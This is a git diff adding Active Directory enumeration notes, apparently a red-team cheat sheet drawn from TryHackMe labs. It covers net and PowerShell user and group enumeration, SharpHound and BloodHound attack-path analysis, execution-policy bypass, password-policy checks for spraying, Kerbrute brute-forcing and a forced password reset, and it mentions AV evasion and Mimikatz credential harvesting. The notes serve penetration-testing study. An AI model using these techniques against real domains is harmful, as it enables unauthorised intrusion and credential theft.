@@ -24,10 +24,6 @@ wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/mast
 wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.txt
 ```
 
-
-
-
-
 ## Information Gathering
 
 **Examples**
@@ -41,6 +37,339 @@ The output of the systeminfo provides information about the machine, including t
 ```
 systeminfo | findstr Domain
 ```
+
+### Users
+
+**Examples**
+
+[enumerating-active-directory.md](../../walkthroughs/tryhackme/enumerating-active-directory.md "mention")
+
+We can use the `net` command to list all users in the AD domain by using the `user` sub-option:
+
+**Victim(cmd)**
+
+```
+net user /domain
+```
+
+This will return all AD users for us and can be helpful in determining the size of the domain to stage further attacks. We can also use this sub-option to enumerate more detailed information about a single user account:
+
+**Victim(cmd)**
+
+```
+net user $USERNAME /domain
+```
+
+**Victim(powershell)**
+
+```
+Get-ADUser -Identity $USERNAME -Server $DOMAINHOSTNAME -Properties *
+```
+
+The parameters are used for the following:
+
+* \-Identity - The account name that we are enumerating
+* \-Properties - Which properties associated with the account will be shown, \* will show all properties
+* \-Server - Since we are not domain-joined, we have to use this parameter to point it to our domain controller
+
+### Groups
+
+**Examples**
+
+[enumerating-active-directory.md](../../walkthroughs/tryhackme/enumerating-active-directory.md "mention")
+
+We can use the `net` command to enumerate the groups of the domain by using the `group` sub-option:
+
+**Victim(cmd)**
+
+```
+net group /domain
+```
+
+This information can help us find specific groups to target for goal execution. We could also enumerate more details such as membership to a group by specifying the group in the same command:
+
+**Victim(cmd)**
+
+```
+net group "$GROUPNAME" /domain
+```
+
+**Victim(powershell)**
+
+```
+Get-ADGroup -Identity "$GROUPNAME" -Server $DOMAINHOSTNAME
+```
+
+We can also enumerate group membership using the `Get-ADGroupMember` cmdlet:
+
+**Victim(powershell)**
+
+```
+Get-ADGroupMember -Identity "$GROUPNAME" -Server $DOMAINHOSTNAME
+```
+
+## SharpHound and Bloodhound
+
+**Examples**
+
+[post-exploitation-basics.md](../../walkthroughs/tryhackme/post-exploitation-basics.md "mention")[enumerating-active-directory.md](../../walkthroughs/tryhackme/enumerating-active-directory.md "mention")
+
+**Bloodhound Examples**
+
+[exploiting-active-directory.md](../../walkthroughs/tryhackme/exploiting-active-directory.md "mention")
+
+You will often hear users refer to Sharphound and Bloodhound interchangeably. However, they are not the same. Sharphound is the enumeration tool of Bloodhound. It is used to enumerate the AD information that can then be visually displayed in Bloodhound. Bloodhound is the actual GUI used to display the AD attack graphs. Therefore, we first need to learn how to use Sharphound to enumerate AD before we can look at the results visually using Bloodhound.
+
+There are three different Sharphound collectors:
+
+* Sharphound.ps1 - PowerShell script for running Sharphound. However, the latest release of Sharphound has stopped releasing the Powershell script version. This version is good to use with RATs since the script can be loaded directly into memory, evading on-disk AV scans.\
+
+* Sharphound.exe - A Windows executable version for running Sharphound.
+* AzureHound.ps1 - PowerShell script for running Sharphound for Azure (Microsoft Cloud Computing Services) instances. Bloodhound can ingest data enumerated from Azure to find attack paths related to the configuration of Azure Identity and Access Management.
+
+```
+Sharphound.exe --CollectionMethods $CollectionMethods  --Domain $DOMAINNAME --ExcludeDCs
+```
+
+Parameters explained:
+
+* CollectionMethods - Determines what kind of data Sharphound would collect. The most common options are Default or All. Also, since Sharphound caches information, once the first run has been completed, you can only use the Session collection method to retrieve new user sessions to speed up the process.
+* Domain - Here, we specify the domain we want to enumerate. In some instances, you may want to enumerate a parent or other domain that has trust with your existing domain. You can tell Sharphound which domain should be enumerated by altering this parameter.
+* ExcludeDCs -This will instruct Sharphound not to touch domain controllers, which reduces the likelihood that the Sharphound run will raise an alert.
+
+You can find all the various Sharphound parameters [here](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html). It is good to overview the other parameters since they may be required depending on your red team assessment circumstances.
+
+Using your SSH PowerShell session from the previous task, copy the Sharphound binary to your AD user's Documents directory:
+
+**Victim(powershell)**
+
+```
+copy C:\Tools\Sharphound.exe ~\Documents\
+cd ~\Documents\
+```
+
+We will run Sharphound using the All and Session collection methods:
+
+**Victim(powershell)**
+
+```
+SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
+```
+
+<figure><img src="../../.gitbook/assets/image (39) (3) (1).png" alt=""><figcaption></figcaption></figure>
+
+It will take about 1 minute for Sharphound to perform the enumeration. In larger organisations, this can take quite a bit longer, even hours to execute for the first time. Once completed, you will have a timestamped ZIP file in the same folder you executed Sharphound from.
+
+<figure><img src="../../.gitbook/assets/image (27) (5) (2).png" alt=""><figcaption></figcaption></figure>
+
+In another Terminal tab, run `bloodhound --no-sandbox`. This will show you the authentication GUI:
+
+<figure><img src="../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>
+
+The default credentials for the neo4j database will be `neo4j:neo4j`. Use this to authenticate in Bloodhound. To import our results, you will need to recover the ZIP file from the Windows host. The simplest way is to use SCP command on your AttackBox:
+
+```
+scp <AD Username>@THMJMP1.za.tryhackme.com:C:/Users/<AD Username>/Documents/<Sharphound ZIP> .
+```
+
+Once you provide your password, this will copy the results to your current working directory. Drag and drop the ZIP file onto the Bloodhound GUI to import into Bloodhound. It will show that it is extracting the files and initiating the import.
+
+<figure><img src="../../.gitbook/assets/image (24) (3).png" alt=""><figcaption></figcaption></figure>
+
+Once all JSON files have been imported, we can start using Bloodhound to enumerate attack paths for this specific domain.\
+
+
+### Attack Paths
+
+There are several attack paths that Bloodhound can show. Pressing the three stripes next to "Search for a node" will show the options. The very first tab shows us the information regarding our current imports.
+
+<figure><img src="../../.gitbook/assets/image (38) (2).png" alt=""><figcaption></figcaption></figure>
+
+Note that if you import a new run of Sharphound, it would cumulatively increase these counts. First, we will look at Node Info. Let's search for our AD account in Bloodhound. You must click on the node to refresh the view. Also note you can change the label scheme by pressing LeftCtrl.
+
+<figure><img src="../../.gitbook/assets/image (41) (3).png" alt=""><figcaption></figcaption></figure>
+
+We can see that there is a significant amount of information returned regarding our use. Each of the categories provides the following information:
+
+* Overview - Provides summaries information such as the number of active sessions the account has and if it can reach high-value targets.\
+
+* Node Properties - Shows information regarding the AD account, such as the display name and the title.\
+
+* Extra Properties - Provides more detailed AD information such as the distinguished name and when the account was created.\
+
+* Group Membership - Shows information regarding the groups that the account is a member of.\
+
+* Local Admin Rights - Provides information on domain-joined hosts where the account has administrative privileges.\
+
+* Execution Rights - Provides information on special privileges such as the ability to RDP into a machine.\
+
+* Outbound Control Rights - Shows information regarding AD objects where this account has permissions to modify their attributes.\
+
+* Inbound Control Rights -  Provides information regarding AD objects that can modify the attributes of this account.
+
+If you want more information in each of these categories, you can press the number next to the information query. For instance, let's look at the group membership associated with our account. By pressing the number next to "First Degree Group Membership", we can see that our account is a member of two groups.
+
+<figure><img src="../../.gitbook/assets/image (1) (2) (1) (4).png" alt=""><figcaption></figcaption></figure>
+
+Next, we will be looking at the Analysis queries. These are queries that the creators of Bloodhound have written themselves to enumerate helpful information.
+
+<figure><img src="../../.gitbook/assets/image (4) (1) (10).png" alt=""><figcaption></figcaption></figure>
+
+Under the Domain Information section, we can run the Find all Domain Admins query. Note that you can press LeftCtrl to change the label display settings.
+
+<figure><img src="../../.gitbook/assets/image (2) (1) (3).png" alt=""><figcaption></figcaption></figure>
+
+The icons are called nodes, and the lines are called edges. Let's take a deeper dive into what Bloodhound is showing us. There is an AD user account with the username of T0\_TINUS.GREEN, that is a member of the group Tier 0 ADMINS. But, this group is a nested group into the DOMAIN ADMINS group, meaning all users that are part of the Tier 0 ADMINS group are effectively DAs.
+
+Furthermore, there is an additional AD account with the username of ADMINISTRATOR that is part of the DOMAIN ADMINS group. Hence, there are two accounts in our attack surface that we can probably attempt to compromise if we want to gain DA rights. Since the ADMINISTRATOR account is a built-in account, we would likely focus on the user account instead.\
+
+
+Each AD object that was discussed in the previous tasks can be a node in Bloodhound, and each will have a different icon depicting the type of object it is. If we want to formulate an attack path, we need to look at the available edges between the current position and privileges we have and where we want to go. Bloodhound has various available edges that can be accessed by the filter icon:
+
+<figure><img src="../../.gitbook/assets/image (47) (3) (1).png" alt=""><figcaption></figcaption></figure>
+
+These are also constantly being updated as new attack vectors are discovered. We will be looking at exploiting these different edges in a future network. However, let's look at the most basic attack path using only the default and some special edges. We will run a search in Bloodhound to enumerate the attack path. Press the path icon to allow for path searching.
+
+<figure><img src="../../.gitbook/assets/image (5) (4) (3).png" alt=""><figcaption></figcaption></figure>
+
+Our Start Node would be our AD username, and our End Node will be the Tier 1 ADMINS group since this group has administrative privileges over servers.
+
+<figure><img src="../../.gitbook/assets/image (50) (1).png" alt=""><figcaption></figcaption></figure>
+
+If there is no available attack path using the selected edge filters, Bloodhound will display "No Results Found". Note, this may also be due to a Bloodhound/Sharphound mismatch, meaning the results were not properly ingested. Please make use of Bloodhound v4.1.0. However, in our case, Bloodhound shows an attack path. It shows that one of the T1 ADMINS, ACCOUNT,  broke the tiering model by using their credentials to authenticate to THMJMP1, which is a workstation. It also shows that any user that is part of the DOMAIN USERS group, including our AD account, has the ability to RDP into this host.
+
+We could do something like the following to exploit this path:
+
+1. Use our AD credentials to RDP into THMJMP1.
+2. Look for a privilege escalation vector on the host that would provide us with Administrative access.
+3. Using Administrative access, we can use credential harvesting techniques and tools such as Mimikatz.
+4. Since the T1 Admin has an active session on THMJMP1, our credential harvesting would provide us with the NTLM hash of the associated account.
+
+This is a straightforward example. The attack paths may be relatively complex in normal circumstances and require several actions to reach the final goal. If you are interested in the exploits associated with each edge, the following [Bloodhound documentation](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) provides an excellent guide. Bloodhound is an incredibly powerful AD enumeration tool that provides in-depth insights into the AD structure of an attack surface. It is worth the effort to play around with it and learn its various features.
+
+
+
+Add this line to SharpHound.ps1 before transferring so I could run the command right away
+
+<figure><img src="../../.gitbook/assets/image (3) (1) (4) (1).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+powershell -ep bypass
+.\SharpHound.ps1
+```
+
+**Kali**
+
+```
+apt-get install bloodhound
+neo4j console
+bloodhound --no-sandbox
+```
+
+### Find all Domain Admins
+
+<figure><img src="../../.gitbook/assets/image (15) (7) (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (84) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+### List all Kerberostable accounts
+
+<figure><img src="../../.gitbook/assets/image (85) (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (3).png" alt=""><figcaption></figcaption></figure>
+
+
+
+##
+
+
+
+### AD Objects
+
+**Examples**
+
+[enumerating-active-directory.md](../../walkthroughs/tryhackme/enumerating-active-directory.md "mention")
+
+A more generic search for any AD objects can be performed using the `Get-ADObject` cmdlet. For example, if we are looking for all AD objects that were changed after a specific date:
+
+**Victim(powershell)**
+
+```
+$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
+Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
+```
+
+### Domains
+
+**Examples**
+
+[enumerating-active-directory.md](../../walkthroughs/tryhackme/enumerating-active-directory.md "mention")
+
+We can use `Get-ADDomain` to retrieve additional information about the specific domain:
+
+**Victim(powershell)**
+
+```
+Get-ADDomain -Server $DOMAINHOSTNAME
+```
+
+### Password Policy
+
+**Examples**
+
+[enumerating-active-directory.md](../../walkthroughs/tryhackme/enumerating-active-directory.md "mention")
+
+We can use the `net` command to enumerate the password policy of the domain by using the `accounts` sub-option:
+
+**Victim(cmd)**
+
+```
+net accounts /domain
+```
+
+This will provide us with helpful information such as:
+
+* Length of password history kept. Meaning how many unique passwords must the user provide before they can reuse an old password.
+* The lockout threshold for incorrect password attempts and for how long the account will be locked.
+* The minimum length of the password.
+* The maximum age that passwords are allowed to reach indicating if passwords have to be rotated at a regular interval.
+
+This information can benefit us if we want to stage additional password spraying attacks against the other user accounts that we have now enumerated. It can help us better guess what single passwords we should use in the attack and how many attacks can we run before we risk locking accounts. However, it should be noted that if we perform a blind password spraying attack, we may lock out accounts anyway since we did not check to determine how many attempts that specific account had left before being locked.\
+
+
+You can find the full range of options associated with the net command [here](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems). Play around with these net commands to gather information about specific users and groups.\
+
+
+#### Benefits
+
+* No additional or external tooling is required, and these simple commands are often not monitored for by the Blue team.
+* We do not need a GUI to do this enumeration.
+* VBScript and other macro languages that are often used for phishing payloads support these commands natively so they can be used to enumerate initial information regarding the AD domain before more specific payloads are crafted.
+
+#### Drawbacks
+
+* The `net` commands must be executed from a domain-joined machine. If the machine is not domain-joined, it will default to the WORKGROUP domain.
+* The `net` commands may not show all information. For example, if a user is a member of more than ten groups, not all of these groups will be shown in the output.
+
+### Altering AD Objects
+
+**Examples**
+
+[enumerating-active-directory.md](../../walkthroughs/tryhackme/enumerating-active-directory.md "mention")
+
+The great thing about the AD-RSAT cmdlets is that some even allow you to create new or alter existing AD objects. However, our focus for this network is on enumeration. Creating new objects or altering existing ones would be considered AD exploitation, which is covered later in the AD module.
+
+However, we will show an example of this by force changing the password of our AD user by using the `Set-ADAccountPassword` cmdlet:
+
+**Victim(powershell)**
+
+```
+Set-ADAccountPassword -Identity $USERNAME -Server $DOMAINHOSTNAME -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
+```
+
+
 
 
 
@@ -73,12 +402,6 @@ Use the Get-ADUser -Filter \* -SearchBase command to list the available user acc
  Get-ADUser -Filter * -SearchBase "OU=THM,DC=THMREDTEAM,DC=COM"
 ```
 
-
-
-
-
-
-
 ## Enumeration w/ Kerbrute
 
 This will brute force user accounts from a domain controller using a supplied wordlist
@@ -92,8 +415,6 @@ This will brute force user accounts from a domain controller using a supplied wo
 ```
 ./kerbrute userenum --dc $DOMAINCONTROLLER -d $DOMAIN $USERLIST.txt
 ```
-
-
 
 ## Harvesting & Brute-Forcing Tickets w/ Rubeus
 
@@ -616,7 +937,7 @@ tftp -i $THMMDTIP  GET "<PXE Boot Image Location>" pxeboot.wim
 Get-FindCredentials -WimFile pxeboot.wim
 ```
 
-## C
+###
 
 
 
